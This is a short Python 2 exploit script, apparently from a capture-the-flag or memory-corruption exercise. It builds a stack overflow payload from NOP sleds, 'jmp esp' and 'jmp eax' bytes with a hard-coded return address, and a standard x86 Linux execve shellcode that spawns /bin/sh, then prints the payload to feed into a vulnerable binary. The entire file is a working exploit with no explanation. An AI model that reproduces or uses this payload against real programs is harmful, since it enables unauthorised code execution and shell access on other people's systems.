#!/usr/bin/env python2

payload = "\x90" * 6
payload += "\xff\xe4" # jmp esp
payload += "\x90" * 20
payload += "\x4b\x33\x05\x08" # jmp eax
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print payload
